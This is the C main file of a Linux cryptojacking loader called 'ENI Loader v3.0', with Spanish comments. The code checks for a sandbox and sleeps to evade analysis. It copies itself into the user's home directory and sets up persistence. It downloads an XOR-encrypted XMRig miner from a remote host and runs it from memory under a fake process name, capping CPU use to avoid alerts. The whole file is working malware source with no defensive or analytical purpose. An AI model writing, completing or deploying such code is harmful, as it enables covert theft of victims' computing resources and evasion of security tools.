#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/stat.h>
#include "loader.h"
#include "recon.h"
#include "memexec.h"
#include "network.h"
#include "crypto.h"
#include "persistence.h"
#include "config.h"

/*
 * ENI Loader v3.0 - Userland Edition
 * "Sin root, pero con alma."
 */

void install_self(char *current_path, char *out_path, size_t size) {
    char *home = getenv("HOME");
    if (!home) return;

    // Construir directorio destino
    char install_dir[512];
    snprintf(install_dir, sizeof(install_dir), "%s/%s", home, INSTALL_DIR);

    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", install_dir);
    if (system(cmd) != 0) { /* Ignorar error */ }

    snprintf(out_path, size, "%s/%s", install_dir, INSTALL_NAME);

    // Si ya estamos ejecutándonos desde ahí, no hacer nada
    if (strcmp(current_path, out_path) == 0) {
        return;
    }

    // Copiar binario
    FILE *src = fopen(current_path, "rb");
    FILE *dst = fopen(out_path, "wb");

    if (src && dst) {
        unsigned char buffer[4096];
        size_t bytes;
        while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
            fwrite(buffer, 1, bytes, dst);
        }
        fclose(src);
        fclose(dst);
        chmod(out_path, 0755); // Hacer ejecutable
    }
}

int main(int argc, char *argv[], char *envp[]) {
    srand(time(NULL));

    // 1. Anti-Sandbox / Recon
    if (is_sandboxed()) {
        // Comportamiento evasivo: dormir o salir
        // Dormir mucho tiempo a veces rompe sandboxes acelerados
        sleep(600);
    }

    system_info_t info;
    audit_system(&info);

    // 2. Instalación y Persistencia
    char self_path[512];
    memset(self_path, 0, sizeof(self_path));
    if (readlink("/proc/self/exe", self_path, sizeof(self_path) - 1) > 0) {

        char install_path[512];
        install_self(self_path, install_path, sizeof(install_path));

        // Si nos hemos instalado en una ruta nueva, desplegamos persistencia apuntando a ELLA
        if (strlen(install_path) > 0) {
            deploy_persistence(install_path);

            // Opcional: Si no estamos en la ruta de instalación, relanzarnos desde allí y salir
            // Para asegurar que corremos desde el lugar "seguro"
            if (strcmp(self_path, install_path) != 0) {
                 // execl(install_path, install_path, NULL);
                 // Por ahora seguimos ejecutando para no perder la sesión
            }
        } else {
            deploy_persistence(self_path);
        }
    }

    // 3. Descarga de Payload (XMRig)
    size_t payload_len = 0;
    unsigned char *payload = NULL;
    int retries = 0;

    while (retries < MAX_RETRIES) {
        payload = download_stage(PAYLOAD_HOST, PAYLOAD_PATH, &payload_len);
        if (payload) break;
        retries++;
        sleep(RETRY_DELAY_SEC);
    }

    if (!payload) {
        return 1; // Fallo silencioso
    }

    // 4. Descifrado
    xor_payload(payload, payload_len, ENCRYPTION_KEY);

    // 5. Preparación de Ejecución
    // Construir argumentos para XMRig
    // El primer argumento es el nombre del proceso (argv[0])
    char *xmrig_argv[] = {
        PROC_NAME,      // Nombre falso proceso
        "-o", POOL_URL,
        "-u", WALLET_ADDR,
        "-p", PASSWD,
        "--donate-level", "0",
        "--cpu-max", "75", // No quemar la CPU para evitar alertas
        "-B", // Background (aunque execve lo maneja, xmrig tiene flag)
        NULL
    };

    // Entorno mínimo
    char *xmrig_envp[] = {
        "HOME=/tmp",
        "PATH=/bin:/usr/bin",
        NULL
    };

    // 6. Ejecución en Memoria
    // execute_from_mem reemplazará este proceso con XMRig
    // Si falla, liberamos memoria
    if (execute_from_mem(payload, payload_len, xmrig_argv, xmrig_envp) == -1) {
        free(payload);
        return 1;
    }

    // Código inalcanzable si execve tiene éxito
    return 0;
}
